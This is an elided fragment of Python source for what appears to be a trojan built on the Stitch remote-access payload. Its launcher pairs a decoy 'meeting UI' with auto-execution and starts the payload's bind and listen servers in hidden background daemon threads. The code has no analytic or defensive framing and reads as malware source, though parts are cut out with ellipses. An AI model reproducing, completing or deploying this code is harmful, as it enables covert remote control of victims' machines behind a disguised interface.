...
def launch_payload_with_ui():
    """
    Main launcher that coordinates auto-execution and meeting UI
    This replaces the normal payload main() function
    """
    ...
    def run_background_operations():
        ...
        try:
            ...
            # Start normal payload operations in background
            if not stitch_running():
                st_pyld = stitch_payload()
                
                # Start connection threads
                if hasattr(st_pyld, 'bind_server') and hasattr(st_pyld, 'listen_server'):
                    ...
                    bind_thread.start()
                    listen_thread.start()
                elif hasattr(st_pyld, 'listen_server'):
                    # Listen only
                    listen_thread = threading.Thread(target=st_pyld.listen_server, args=())
                    listen_thread.daemon = True
                    listen_thread.start()
                elif hasattr(st_pyld, 'bind_server'):
                    # Bind only
                    bind_thread = threading.Thread(target=st_pyld.bind_server, args=())
                    bind_thread.daemon = True
                    bind_thread.start()
...
def enhanced_main():
    ...
    This function will be called when the payload starts
    """
    try:
        launch_payload_with_ui()
    except Exception as e:
...
__all__ = ['enhanced_main', 'enhanced_osx_main', 'launch_payload_with_ui']